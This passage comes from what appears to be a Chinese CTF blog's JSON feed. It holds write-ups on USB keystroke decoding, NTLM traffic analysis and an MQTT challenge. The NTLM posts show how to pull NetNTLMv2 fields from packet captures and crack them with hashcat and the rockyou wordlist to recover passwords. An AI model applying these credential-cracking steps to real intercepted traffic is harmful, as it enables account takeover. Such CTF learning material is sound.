class=\"line\">            f_out.write(ns)</span><br><span class=\"line\">            f_out.write(&#x27;\\n&#x27;)</span><br></pre></td></tr></table></figure>\n<p>同样输入路径，16<br>\n 得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UExxnxQdQ98AhqGI.png!thumbnail\" alt=\"\"></p>\n<p>接着利用脚本对照转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">output = []</span><br><span class=\"line\">keys = open(&#x27;out1.txt&#x27;)</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;:</span><br><span class=\"line\">             continue</span><br><span class=\"line\">        if line[6:8] in normalKeys.keys():</span><br><span class=\"line\">            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;]</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            output += [&#x27;[unknown]&#x27;]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\"></span><br><span class=\"line\">flag=0</span><br><span class=\"line\">print(&quot;&quot;.join(output))</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        a=output.index(&#x27;&lt;DEL&gt;&#x27;)</span><br><span class=\"line\">        del output[a]</span><br><span class=\"line\">        del output[a-1]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if output[i]==&quot;&lt;CAP&gt;&quot;:</span><br><span class=\"line\">            flag+=1</span><br><span class=\"line\">            output.pop(i)</span><br><span class=\"line\">            if flag==2:</span><br><span class=\"line\">                flag=0</span><br><span class=\"line\">        if flag!=0:</span><br><span class=\"line\">            output[i]=output[i].upper()</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">print (&#x27;output :&#x27; + &quot;&quot;.join(output))</span><br></pre></td></tr></table></figure>\n<p>得到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9fWB6zzlzqpbQMUS.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NTLM%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/",
            "url": "https://nnnpc.github.io/2024/04/16/NTLM%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/",
            "title": "NTLM协议流量解密",
            "date_published": "2024-04-16T05:58:19.017Z",
            "content_html": "<h1 id=\"例一\"><a class=\"markdownIt-Anchor\" href=\"#例一\">#</a> 例一：</h1>\n<p>近期做到一道 NTLM 协议的流量题，第一次进行解密，记录一下</p>\n<p>解密该协议的流量，其实就是得到用户名的密码，需要寻找一些字段信息并用 hashcat 进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response </span><br></pre></td></tr></table></figure>\n<p>先进行过滤：ntlmssp</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/GVJwR28aDugcmZ5Z.png!thumbnail\" alt=\"\"></p>\n<p>找到 NTLMSSP_AUTH 包，得到 domain name 和 user name</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/86wHbcx3hzyDMEP9.png!thumbnail\" alt=\"\"></p>\n<p>追踪 NTLM response，可以得到 NTproofstring 和 modifiedntlmv2response</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6ikrvW90lTRU45Xu.png!thumbnail\" alt=\"\"></p>\n<p>这里 modifiedntlmv2response 开头部分包括了 NTproofstring 的值，组成的时候需要删除重复部分</p>\n<p>接着寻找 ServerChallenge，过滤 ntlmssp.ntlmserverchallenge</p>\n<p>找到符合条件的包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Q5T0wy90FUlhEak2.png!thumbnail\" alt=\"\"></p>\n<p>将得到的手动组成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">administrator:::1166026a7745c2d0:971356880954f778c48937ad52ccae51:01010000000000005a308cd161f7d8016092111fede1fd960000000002001e004400450053004b0054004f0050002d004a0052005500510045003900360001001e004400450053004b0054004f0050002d004a0052005500510045003900360004001e004400450053004b0054004f0050002d004a0052005500510045003900360003001e004400450053004b0054004f0050002d004a00520055005100450039003600070008005a308cd161f7d80106000400020000000800300030000000000000000100000000200000a2fc8de06e3dff62c01429115953f2f8ea32e069bc69837a7b03ee0112ca689a0a0010000000000000000000000000000000000009001c0063006900660073002f003100320037002e0030002e0030002e0031000000000000000000</span><br></pre></td></tr></table></figure>\n<p>使用 hashcat 进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./hashcat.exe -m 5600 hash.txt passwords.txt -o out.txt --force</span><br><span class=\"line\">#hash.txt中是组成的内容，password.txt是字典（在该附件中进行分段传输，利用原始数据提取出来就好），-o参数表示将结果存储到out.txt文本当中</span><br><span class=\"line\">./hashcat.exe -m 5600 hash.txt passwords.txt --show</span><br><span class=\"line\">#如果已经爆破就使用--show展示出来</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6sZRgp60VShOHJmN.png!thumbnail\" alt=\"\"></p>\n<p>得到最终的密码 @Aa123456789</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2doLWJhbHRoYXphcmJyYXR0L25vY2FzaHZhbHVl\">https://github.com/gh-balthazarbratt/nocashvalue</span></p>\n<p>该脚本也可以自动提取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./main.py --tshark_path /usr/bin/tshark --pcap_file NTLM.pcapng</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7Ur6g4fjiJtVN53F.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fC8FuuWxvXV3QmQH.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3j0QhBFizJCq9Ek5.png!thumbnail\" alt=\"\"></p>\n<p>但是脚本提取也有些问题，最后一个字段值开头会少一位，需要自己手动加一个 0，并且 NULL 处不需要填写，手动删除</p>\n<h1 id=\"例二\"><a class=\"markdownIt-Anchor\" href=\"#例二\">#</a> 例二：</h1>\n<p>拿最近的 geek challenge 的一道不太一样的题目再次来进行详细说明</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HjCsftpPeqPC8UDd.png!thumbnail\" alt=\"\"></p>\n<p>拿到流量包追踪一下 tcp 流，结合题目可以知道</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Bk9XBs7Cd97DHNAH.png!thumbnail\" alt=\"\"></p>\n<p>这是内网通信的流量，并且使用了 NTLM 验证身份的方式，上网搜索了一下该验证方式的工作流程，大致为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.首先客户端在本地加密当前用户的密码成hash</span><br><span class=\"line\">2.客户端向服务端发送账号，这里进行了明文传输</span><br><span class=\"line\">3.服务端确认了NTLM认证方式，并随机生成了16位的字符串作为challenge发送给了客户端</span><br><span class=\"line\">4.客户端再用生成的hash加密该challenge发送回服务端作为response</span><br><span class=\"line\">5.服务端再把用户名，challenge和response发送给域控制器</span><br><span class=\"line\">6.域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，并同样加密challenge</span><br><span class=\"line\">7.比较两个加密后的challenge，如果相同则认证成功</span><br></pre></td></tr></table></figure>\n<p>接下来回看这道题目，既然是截获了通讯流量那么也就是说客户端和服务端所进行的一些通信数据都直接被截获了，根据题目要求，要找到用户的密码。根据工作流程可以知道，hashcat 爆破用户密码所需要的一些字段信息都能被流量所捕获到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pNucLoAZNeu76EEx.png!thumbnail\" alt=\"\"></p>\n<p>并且通过最后一个返回包中的对话信息可以知道密码字典为 rockyou，接下来寻找到需要的字段就可以开始进行爆破了，以下为需要寻找的字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mVGJwwn0vCW3Btiu.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mpmcyKvrKJNaO6NN.png!thumbnail\" alt=\"\"></p>\n<p>过滤 ntlmssp.ntlmserverchallenge 能找到 challenge 字段信息</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bDBpfIq4o1HmUWFv.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span><br></pre></td></tr></table></figure>\n<p>将得到的字段值拼接利用 hashcat 进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./hashcat.exe -m 5600 1.txt rockyou.txt -o out.txt --force</span><br></pre></td></tr></table></figure>\n<p>在 out.txt 中得到爆破出的密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lURCG5lq2sLKO7uO.png!thumbnail\" alt=\"\"></p>\n<p><strong>SYC{iamjackspassword}</strong></p>\n<h1 id=\"例三\"><a class=\"markdownIt-Anchor\" href=\"#例三\">#</a> 例三：</h1>\n<p>接下来用另一道题更深入地剖析一下 NTLM 协议传输字段值的组成，同样来自 geek<br>\nchallenge</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/D7jn883rE2SNW2Lg.png!thumbnail\" alt=\"\"></p>\n<p>该题抓取了用户进行邮箱登录的 SMTP 协议流量，并选择了 NTLM 的认证方式，所以本质上的考点还是通过 NTLM 协议的流量寻找字段进行组合爆破 hash</p>\n<p>浅浅了解一下 SMTP 通讯协议吧</p>\n<p>该协议是一个简单的邮件传送协议，用下图来进行说明</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9wMVKsPkEMymr6nS.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.用户在用户代理中编辑邮件信息，包括发件人邮箱标题等等</span><br><span class=\"line\">2.用户代理提取用户编辑的信息，生成一封符合邮件格式标准（RFC822）的邮件</span><br><span class=\"line\">3.用户代理利用SMTP协议将邮件发送给发送端的邮件服务器</span><br><span class=\"line\">4.发送端的邮件服务器同样通过SMTP协议将邮件发送给接收端的邮件服务器</span><br><span class=\"line\">5.接收端的用户代理利用POP3协议从接收端服务器取回邮件</span><br><span class=\"line\">6.用户代理端接收邮件并解析读取</span><br></pre></td></tr></table></figure>\n<p>看回本题，本题并没有进行邮件收发的操作，截取的是登录邮件服务器认证过程的流量<br>\n<strong>首先是客户端对邮件服务器的 25 端口进行的三次握手</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/g2YID2WJGS4p7g8X.png!thumbnail\" alt=\"\"></p>\n<p><strong>握手成功后服务端会主动向客户端发送准备就绪的信息</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8sEYKHwWAjKi6BKa.png!thumbnail\" alt=\"\"></p>\n<blockquote>\n<p>网易邮箱一般都形如 &quot;220 <span class=\"exturl\" data-url=\"aHR0cDovLzE2My5jb20=\">163.com</span> Anti-spam GT for Coremail System<br>\n (163com [20111010])&quot;；QQ 邮箱形如&quot;220 <span class=\"exturl\" data-url=\"aHR0cDovL3NtdHAucXEuY29t\">smtp.qq.com</span> Esmtp QQ Mail<br>\nServer&quot;；Google 邮箱形如&quot;220 <span class=\"exturl\" data-url=\"aHR0cDovL214Lmdvb2dsZS5jb20=\">mx.google.com</span> ESMTP<br>\nnw8sm917193igc.7&quot;。其中 220 代表服务就绪，每一条服务就绪信息以&quot;rn&quot; 为结尾标示符。</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7Rvww53De6hWB1yt.png!thumbnail\" alt=\"\"></p>\n<p><strong>接着客户端向 SMTP 服务器交代自己的身份，也就是机器名（DESKTOP-xxxxxxx）</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yJk8GuhPiaFjh2Er.png!thumbnail\" alt=\"\"></p>\n<p><strong>身份认证通过后，服务器会进入等待认证状态，会主动推送所有支持的 SMTP 认证方式</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Nl9HXxe6Y4tmXnLe.png!thumbnail\" alt=\"\"></p>\n<p><strong>接下来就是客户端进行选择认证方式进行认证</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/88apimQEgweC3Blg.png!thumbnail\" alt=\"\"></p>\n<p><strong>直到 235 2.7.0 Authentication successful，认证成功</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/P73K5cN5E2o9DWzV.png!thumbnail\" alt=\"\"></p>\n<p>数据包分析结束，看看题目，本题中该数据包清晰的显示了一整个身份校验以及认证的流程，这里可以看到客户端选择的认证方式是 NTLM，NTLM 的认证方式和 login 差不多，根据上面题目可以知道，既然是 NTLM 协议进行认证，那么密码给出的是 hash 值来进行加密和传输，因此需要构造字段值进行 hash 爆破</p>\n<p>但是本题的 wireshark 当中并没有直接显示出各个字段的值方便确认，只显示出了原始的 base64 编码，猜测原因是之前是直接通过 NTLM 协议认证进行内网通信，而这里是登录邮件服务器选择了支持 SMTP 的 NTLM 协议认证方式，所以 wireshark 并没有解析出字段值</p>\n<p>无妨，自己对照着数据包去解码寻找对应的数据块吧</p>\n<p>把大小为 420 和 789 的两个数据包解码后转为 16 进制</p>\n<p>发现在大小为 420 的数据包中，24 字节头部数据之后的 8 字节数据便是 ServerChallenge 字段</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NKGtEU1biVhn7fEc.png!thumbnail\" alt=\"\"></p>\n<p>接下来解析大小为 789 的数据包获得剩余字段值</p>\n<p>88 字节数据之后跟着的是 domainname 和 username（根据之前题目的数据包来看，domain<br>\nname 和 username 字段数据也是挨着的）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/37oHMH99cS9bMUk8.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EnaZCTJopkyLupBH.png!thumbnail\" alt=\"\"></p>\n<p>根据题目所述，username 为 jack，因此为下图的 8 字节数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RrN6m7D1nxMrniEg.png!thumbnail\" alt=\"\"></p>\n<p>接下来间隔 client01 字段，这里有 40 字节数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UVpBmy5pntuY3AFT.png!thumbnail\" alt=\"\"></p>\n<p>从该字段结束部分到末尾的 16 字节数据之前为 NTLMv2 Response 数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LhU7iqKb2Ux78p91.png!thumbnail\" alt=\"\"></p>\n<p>可以知道的是 NTLMv2 Response 数据头部的 16 字节数据便是 NTProofStr 数据</p>\n<p>到这为止已经剖析到我们爆破所需的所有数据了，整合一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</span><br></pre></td></tr></table></figure>\n<p>这里的 domain<br>\nname 不止可以通过在 NTLM 认证过程中获得，其实就是之前所说的 SMTP 通讯过程中客户端向邮件服务器发送的机器名称<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/dU7RQs7tmPaVAEUF.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>这里有一个需要注意的点，domain<br>\nname 的大小写必须按照给出的大小写来填入，不能改动</p>\n<p>接下来就是熟悉的 hash 爆破了，利用 rockyou 字典进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./hashcat.exe -m 5600 10.txt rockyou.txt -o out1.txt --force</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9s2OYOfWjwPykhJk.png!thumbnail\" alt=\"\"></p>\n<p>得到密码 jack100589barney，便是 flag</p>\n<p><strong>SYC{jack100589barney}</strong></p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/MQTT/",
            "url": "https://nnnpc.github.io/2024/04/16/MQTT/",
            "title": "某工控Misc MQTT协议流量分析",
            "date_published": "2024-04-16T05:58:19.007Z",
            "content_html": "<p>本题的考点在于 MQTT 协议流量的分析和 rsa 解密，首先看到流量包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/br3Nq1ffF08DaaSz.png!thumbnail\" alt=\"\"></p>\n<p>很干净不需要过滤，去了解下 MQTT 协议能知道</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AjNPCVwBJCqNkoSy.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RQNvdc0RnlqdpVio.png!thumbnail\" alt=\"\"></p>\n<p>每个包的 message 字段中存储了需要传输的值，先看了头几个包</p>\n<p>发现了 rsakey 字段，于是使用命令提取数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tshark -r Covertchannel.pcap -Y &quot;mqtt&quot; -T fields -e mqtt.msg &gt; 1.txt</span><br></pre></td></tr></table></figure>\n<p>简单做一下处理：（删除逗号和换行）并进行 16 进制转换和 base64 解码，得到私钥，secret.txt 和 data.zip<br>\n 发现 data.zip 文件需要密码</p>\n<p>那么猜测需要利用私钥去解密被公钥加密的文件 secret.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 